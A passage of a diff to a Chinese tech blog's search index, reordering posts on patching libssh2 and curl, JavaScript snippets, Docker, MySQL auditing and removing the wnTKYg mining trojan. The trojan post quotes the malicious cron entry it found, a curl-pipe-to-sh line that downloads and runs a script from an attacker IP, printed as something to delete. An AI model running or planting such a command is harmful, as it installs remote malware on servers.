+<li>复查<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -qa libssh2</span><br></pre></td></tr></table></figure></li>
+<li>去阿里云安全中心验证，通过即可</li>
+</ol>
+<hr>
+<p>参考文章：<a href="https://forum.bclinux.org/topic/955/blsa-2019-0038-%E9%87%8D%E8%A6%81-libssh2-%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E5%85%AC%E5%91%8A" target="_blank" rel="noopener">https://forum.bclinux.org/topic/955/blsa-2019-0038-%E9%87%8D%E8%A6%81-libssh2-%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E5%85%AC%E5%91%8A</a></p>
+<h2 id="curl-安全和BUG修复更新"><a href="#curl-安全和BUG修复更新" class="headerlink" title="curl 安全和BUG修复更新"></a>curl 安全和BUG修复更新</h2><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><ol>
+<li>查看yum源设置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ll &#x2F;etc&#x2F;yum.repos.d&#x2F;</span><br></pre></td></tr></table></figure></li>
+<li>安装更新<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y libcurl-devel</span><br><span class="line">yum install -y libcurl</span><br><span class="line">yum install -y curl</span><br><span class="line">或者</span><br><span class="line">yum update -y libcurl-devel</span><br><span class="line">yum update -y libcurl</span><br><span class="line">yum update -y curl</span><br></pre></td></tr></table></figure></li>
+<li>去阿里云安全中心验证，通过即可</li>
+</ol>
+<hr>
+<p>参考文章：<a href="https://www.xuexiareas.com/index/Articles/details/num/315.html" target="_blank" rel="noopener">https://www.xuexiareas.com/index/Articles/details/num/315.html</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>安全防护</tag>
+        <tag>Linux软件漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1096,6 +1047,55 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>JavaScript生成随机数</title>
+    <url>/2017/09/17/3.html</url>
+    <content><![CDATA[<p>随机数在Web开发中的运用还是十分广泛的，比如：验证码的生成、密码的生成、抽奖系统等。</p>
+<a id="more"></a>
+<ul>
+<li><p>预备知识 <code>Math.random()</code> 函数返回0和1之间的伪随机数，可能为0，但总是小于1。</p>
+</li>
+<li><p>生成 <code>n-m</code> ，包含 <code>n</code> 但不包含 <code>m</code> 的整数</p>
+<ol>
+<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code> </li>
+<li>第二步：<code>Math.random()*w</code> </li>
+<li>第三步：<code>Math.random()*w+n</code> </li>
+<li>第四步：<code>parseInt(Math.random()*w+n,10)</code></li>
+</ol>
+</li>
+<li><p>生成 <code>n-m</code>，不包含 <code>n</code> 但包含 <code>m</code> 的整数</p>
+<ol>
+<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code></li>
+<li>第二步：<code>Math.random()*w</code></li>
+<li>第三步：<code>Math.random()*w+n</code></li>
+<li>第四步：<code>Math.floor(Math.random()*w+n)+1</code></li>
+</ol>
+</li>
+<li><p>生成 <code>n-m</code>，不包含 <code>n</code> 和 <code>m</code> 的整数</p>
+<ol>
+<li>第一步：算出 <code>m-n-2</code> 的值，假设等于 <code>w</code></li>
+<li>第二步：<code>Math.random()*w</code></li>
+<li>第三步：<code>Math.random()*w+n+1</code></li>
+<li>第四步：<code>Math.round(Math.random()*w+n+1)</code> 或者 <code>Math.ceil(Math.random()*w+n+1)</code></li>
+</ol>
+</li>
+<li><p>生成 <code>n-m</code>，包含 <code>n</code> 和 <code>m</code> 的整数</p>
+<ol>
+<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code></li>
+<li>第二步：<code>Math.random()*w</code></li>
+<li>第三步：<code>Math.random()*w+n</code></li>
+<li>第四步：<code>Math.round(Math.random()*w+n)</code> 或者 <code>Math.ceil(Math.random()*w+n)</code></li>
+</ol>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>JavaScript</category>
+      </categories>
+      <tags>
+        <tag>随机数</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows10下dnmp环境搭建</title>
     <url>/2019/11/25/31.html</url>
     <content><![CDATA[<p>本文是对Windows10系统下搭建dnmp环境的步骤做一次记录，顺便对搭建过程中遇到的问题进行相应的说明。</p>
@@ -1139,33 +1139,6 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       <tags>
         <tag>dnmp环境</tag>
         <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用JS实现银行卡卡号和手机号的中间数字以星号表示</title>
-    <url>/2017/09/27/4.html</url>
-    <content><![CDATA[<p>在WAP开发过程中，肯定遇到过银行卡卡号和手机号的中间数字是星号的情况。下面来介绍一下如何使用原生JS实现这个功能。</p>
-<a id="more"></a>
-<p>废话不多说直接贴出银行卡卡号的代码：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"2222333344445555"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(\d&#123;4&#125;)\d+(\d&#123;4&#125;)$/</span>;</span><br><span class="line">str = str.replace(reg, <span class="string">"$1 **** **** $2"</span>);</span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<blockquote>
-<p>2222 <strong>** **</strong> 5555</p>
-</blockquote>
-<p>下面是手机号的代码（其实只要照着银行卡的代码略作修改就可以了）：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"13812344321"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(\d&#123;3&#125;)\d+(\d&#123;4&#125;)$/</span>;</span><br><span class="line">str = str.replace(reg, <span class="string">"$1 **** $2"</span>);</span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<blockquote>
-<p>138 **** 4321</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>JavaScript</category>
-      </categories>
-      <tags>
-        <tag>正则</tag>
       </tags>
   </entry>
   <entry>
@@ -1237,6 +1210,25 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>Windows10下Docker无法共享磁盘卷</title>
+    <url>/2019/11/28/33.html</url>
+    <content><![CDATA[<p>使用Docker-Compose启动时，无法共享本地磁盘卷，并且在 <code>Settings -&gt; Shared Drives</code> 中重新设置并单击 <code>Apply</code> 后，仍然失败无法应用。</p>
+<a id="more"></a>
+<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
+<li>查看docker日志，日志位置为： <code>C:\Users\[本机用户名]\AppData\Local\Docker</code> 。查看是否有权限问题，<em>基本不显示</em> 。</li>
+<li>修改策略组权限： <code>运行 -&gt; gpedit.msc -&gt; 计算机配置 -&gt; Windows设置 -&gt; 安全设置 -&gt; 本地策略 -&gt; 安全选项 -&gt; 网络访问：本地账户的共享和安全模式</code> 打开，设置为 <code>经典</code> 。</li>
+<li>保存后重新设置docker的共享文件。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Docker</tag>
+        <tag>磁盘共享</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Centos环境下PHP5.3开启curl_init扩展</title>
     <url>/2017/09/28/5.html</url>
     <content><![CDATA[<p>Centos环境下PHP5.3开启curl_init扩展，也可根据此方法开启其它的PHP扩展。</p>
@@ -1274,63 +1266,6 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Windows10下Docker无法共享磁盘卷</title>
-    <url>/2019/11/28/33.html</url>
-    <content><![CDATA[<p>使用Docker-Compose启动时，无法共享本地磁盘卷，并且在 <code>Settings -&gt; Shared Drives</code> 中重新设置并单击 <code>Apply</code> 后，仍然失败无法应用。</p>
-<a id="more"></a>
-<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
-<li>查看docker日志，日志位置为： <code>C:\Users\[本机用户名]\AppData\Local\Docker</code> 。查看是否有权限问题，<em>基本不显示</em> 。</li>
-<li>修改策略组权限： <code>运行 -&gt; gpedit.msc -&gt; 计算机配置 -&gt; Windows设置 -&gt; 安全设置 -&gt; 本地策略 -&gt; 安全选项 -&gt; 网络访问：本地账户的共享和安全模式</code> 打开，设置为 <code>经典</code> 。</li>
-<li>保存后重新设置docker的共享文件。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>Docker</tag>
-        <tag>磁盘共享</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySql开启安全审计（audit审计插件）</title>
-    <url>/2017/09/28/6.html</url>
-    <content><![CDATA[<p>为了安全和操作的可追溯性考虑，越来越多的公司加入了审计功能。MySql5.5推出了相关的审计功能，到5.6.20功能进一步完善。下面来介绍一下如何开启MySql的audit审计功能。</p>
-<a id="more"></a>
-<ol>
-<li>查看MySql插件目录，即plugin目录</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; show global variables like &#39;plugin_fir&#39;;</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>下载二进制包：<a href="https://bintray.com/mcafee/mysql-audit-plugin/release" target="_blank" rel="noopener">https://bintray.com/mcafee/mysql-audit-plugin/release</a>包含了5.1，5.5，5.6对应的二进制包（如果在plugin目录下有 <code>libaudit_plugin.so</code> 文件，就不用下载了），复制下载的so文件至MySql插件目录</li>
-<li>在线开启audit</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; INSTALL PLUGIN AUDIT SONAME &#39;libaudit_plugin.so&#39;;</span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li>查看对应的版本</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; show global status like &#39;AUDIT_version&#39;;</span><br></pre></td></tr></table></figure>
-
-<p><em>有结果即安装成功！</em>  <strong>查看audit的相关命令：</strong><br><code>mysql &gt; show global variables like &#39;%audit%&#39;;</code><br><strong>设置相关的参数：</strong><br><code>mysql &gt; set global (填写查询后的audit相关命令) = ......;</code></p>
-<ol start="5">
-<li>开启audit功能（关闭就把On改成Off）</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; set global audit_json_file&#x3D;On;</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li>执行Sql语句（对数据库数据有操作就行），看MySql数据目录的 <code>mysql-audit.json</code> 文件是否有变化 <code>（【MySql安装目录】/data/mysql-audit.json）</code></li>
-</ol>
-]]></content>
-      <categories>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>audit审计插件</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用PHPMailer封装类发送邮件</title>
     <url>/2017/09/30/7.html</url>
     <content><![CDATA[<p>近期，打算做一个邮箱注册，使用的是smtp服务。可是奇怪的是在本地调试是好的，一搬到阿里云的服务器上就不行了。想了好久没有答案，所以提了一下工单给阿里云，以下是阿里云的回复。</p>
@@ -1350,49 +1285,6 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
         <tag>PHPMailer</tag>
         <tag>smtp服务</tag>
         <tag>邮件发送类</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>清除wnTKYg挖矿木马病毒</title>
-    <url>/2017/10/08/8.html</url>
-    <content><![CDATA[<p>今天发现网站的后台进不去，而且前台的一些图片也显示不出来。远程连接服务器查看，原来有一个程序占用200%多的CPU，而且这个程序我不认识，好吧肯定是中病毒了。百度一下这个病毒wnTKYg。幸好百度给力啊，第一个就是解决方案，现在把方案和我自己的处理过程做个记录。</p>
-<a id="more"></a>
-<ol>
-<li><p>根据其他人的经验，这个是钻了redis的空子进来的，所以修改redis的相关配置</p>
-<ol>
-<li>修改默认端口</li>
-<li>设置密码</li>
-<li>设置 <code>bind xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx</code></li>
-</ol>
-</li>
-<li><p>查看 <code>/root/.ssh</code> 下的文件，找到 <code>known_hosts</code> 中发现不认识的IP，用防火墙禁掉它</p>
-</li>
-<li><p>查看 <code>/var/spool/cron</code> 文件夹下的定时任务中是否有可疑内容，如果有就干掉它 下面是我的可疑内容情况：  </p>
-<blockquote>
-<p>*/5 * * * * curl -fsSL <a href="http://218.248.40.228:8443/i.sh?6" target="_blank" rel="noopener">http://218.248.40.228:8443/i.sh?6</a> | sh</p>
-</blockquote>
-<p> <strong><em>直接删除即可，然后看一下是否还有哦可疑文件，有就直接删除。（需要百分百确保是没有用的文件）</em></strong></p>
-</li>
-<li><p>查找相关的病毒文件，然后删除此文件</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name wnTKYg*</span><br><span class="line">rm -rf 相应目录下的wnTKYg文件</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>找到此病毒的守护进程，使用top发现可疑进程 <code>ddg.1007</code> ，找到后删除</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name ddg.*</span><br><span class="line">rm -rf 相应目录下的ddg.*文件</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>找到相应的 <code>wnTKYg</code> 进程杀掉（ <code>ddg.1007</code> 同理）</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pgrep wnTKYg | xargs kill -s 9</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<hr>
-<p>参考文章：<a href="http://blog.sina.com.cn/s/blog_c08907b10102wyyl.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_c08907b10102wyyl.html</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>木马病毒</tag>
-        <tag>Redis漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1444,6 +1336,114 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
         <tag>LNMP</tag>
         <tag>一键脚本</tag>
         <tag>运行环境</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用JS实现银行卡卡号和手机号的中间数字以星号表示</title>
+    <url>/2017/09/27/4.html</url>
+    <content><![CDATA[<p>在WAP开发过程中，肯定遇到过银行卡卡号和手机号的中间数字是星号的情况。下面来介绍一下如何使用原生JS实现这个功能。</p>
+<a id="more"></a>
+<p>废话不多说直接贴出银行卡卡号的代码：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"2222333344445555"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(\d&#123;4&#125;)\d+(\d&#123;4&#125;)$/</span>;</span><br><span class="line">str = str.replace(reg, <span class="string">"$1 **** **** $2"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<blockquote>
+<p>2222 <strong>** **</strong> 5555</p>
+</blockquote>
+<p>下面是手机号的代码（其实只要照着银行卡的代码略作修改就可以了）：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"13812344321"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(\d&#123;3&#125;)\d+(\d&#123;4&#125;)$/</span>;</span><br><span class="line">str = str.replace(reg, <span class="string">"$1 **** $2"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<blockquote>
+<p>138 **** 4321</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>JavaScript</category>
+      </categories>
+      <tags>
+        <tag>正则</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>清除wnTKYg挖矿木马病毒</title>
+    <url>/2017/10/08/8.html</url>
+    <content><![CDATA[<p>今天发现网站的后台进不去，而且前台的一些图片也显示不出来。远程连接服务器查看，原来有一个程序占用200%多的CPU，而且这个程序我不认识，好吧肯定是中病毒了。百度一下这个病毒wnTKYg。幸好百度给力啊，第一个就是解决方案，现在把方案和我自己的处理过程做个记录。</p>
+<a id="more"></a>
+<ol>
+<li><p>根据其他人的经验，这个是钻了redis的空子进来的，所以修改redis的相关配置</p>
+<ol>
+<li>修改默认端口</li>
+<li>设置密码</li>
+<li>设置 <code>bind xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx</code></li>
+</ol>
+</li>
+<li><p>查看 <code>/root/.ssh</code> 下的文件，找到 <code>known_hosts</code> 中发现不认识的IP，用防火墙禁掉它</p>
+</li>
+<li><p>查看 <code>/var/spool/cron</code> 文件夹下的定时任务中是否有可疑内容，如果有就干掉它 下面是我的可疑内容情况：  </p>
+<blockquote>
+<p>*/5 * * * * curl -fsSL <a href="http://218.248.40.228:8443/i.sh?6" target="_blank" rel="noopener">http://218.248.40.228:8443/i.sh?6</a> | sh</p>
+</blockquote>
+<p> <strong><em>直接删除即可，然后看一下是否还有哦可疑文件，有就直接删除。（需要百分百确保是没有用的文件）</em></strong></p>
+</li>
+<li><p>查找相关的病毒文件，然后删除此文件</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name wnTKYg*</span><br><span class="line">rm -rf 相应目录下的wnTKYg文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找到此病毒的守护进程，使用top发现可疑进程 <code>ddg.1007</code> ，找到后删除</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name ddg.*</span><br><span class="line">rm -rf 相应目录下的ddg.*文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找到相应的 <code>wnTKYg</code> 进程杀掉（ <code>ddg.1007</code> 同理）</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pgrep wnTKYg | xargs kill -s 9</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<hr>
+<p>参考文章：<a href="http://blog.sina.com.cn/s/blog_c08907b10102wyyl.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_c08907b10102wyyl.html</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>木马病毒</tag>
+        <tag>Redis漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySql开启安全审计（audit审计插件）</title>
+    <url>/2017/09/28/6.html</url>
+    <content><![CDATA[<p>为了安全和操作的可追溯性考虑，越来越多的公司加入了审计功能。MySql5.5推出了相关的审计功能，到5.6.20功能进一步完善。下面来介绍一下如何开启MySql的audit审计功能。</p>
+<a id="more"></a>
+<ol>
+<li>查看MySql插件目录，即plugin目录</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; show global variables like &#39;plugin_fir&#39;;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>下载二进制包：<a href="https://bintray.com/mcafee/mysql-audit-plugin/release" target="_blank" rel="noopener">https://bintray.com/mcafee/mysql-audit-plugin/release</a>包含了5.1，5.5，5.6对应的二进制包（如果在plugin目录下有 <code>libaudit_plugin.so</code> 文件，就不用下载了），复制下载的so文件至MySql插件目录</li>
+<li>在线开启audit</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; INSTALL PLUGIN AUDIT SONAME &#39;libaudit_plugin.so&#39;;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>查看对应的版本</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; show global status like &#39;AUDIT_version&#39;;</span><br></pre></td></tr></table></figure>
+
+<p><em>有结果即安装成功！</em>  <strong>查看audit的相关命令：</strong><br><code>mysql &gt; show global variables like &#39;%audit%&#39;;</code><br><strong>设置相关的参数：</strong><br><code>mysql &gt; set global (填写查询后的audit相关命令) = ......;</code></p>
+<ol start="5">
+<li>开启audit功能（关闭就把On改成Off）</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; set global audit_json_file&#x3D;On;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>执行Sql语句（对数据库数据有操作就行），看MySql数据目录的 <code>mysql-audit.json</code> 文件是否有变化 <code>（【MySql安装目录】/data/mysql-audit.json）</code></li>
+</ol>
+]]></content>
+      <categories>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>audit审计插件</tag>
       </tags>
   </entry>
 </search>
